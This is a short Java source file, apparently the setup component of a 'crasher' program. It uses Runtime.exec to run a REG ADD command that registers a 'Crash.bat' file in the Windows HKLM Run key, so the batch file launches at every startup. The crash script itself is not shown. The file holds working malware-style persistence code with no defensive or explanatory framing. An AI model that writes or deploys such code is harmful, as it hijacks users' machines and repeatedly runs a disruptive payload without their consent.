package uuu;

import java.io.File;
import java.io.IOException;
import java.net.URLDecoder;

/****************
 * 
 * 
 * @author Rediska4445
 *
 *
 */

public class DontCrasherSetup {
	private static String FilePath;
	private static String FilePathImg = "C:\\Users\\2022\\Documents\\Test\\x450.png";
	public static void main(String args[]) throws InterruptedException, IOException {
		 File currentClass = new File(URLDecoder.decode(DontCrasherSetup.class
	                .getProtectionDomain()
	                .getCodeSource()
	                .getLocation()
	                .getPath(), "UTF-8"));
		FilePath = currentClass.getParent() + "\\Crash.bat";
		SetupReg();
//		System.getProperty("os.name");
	}
	
	private static void SetupReg() throws IOException, InterruptedException {
		Runtime.getRuntime().exec("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DoCr /t REG_SZ /d \"\\\"" + FilePath + "\"\\\"");
		//	Open();
	}
	
	public static void Open() throws InterruptedException, IOException {
		DontCrasherMain.main(null);
	}
}

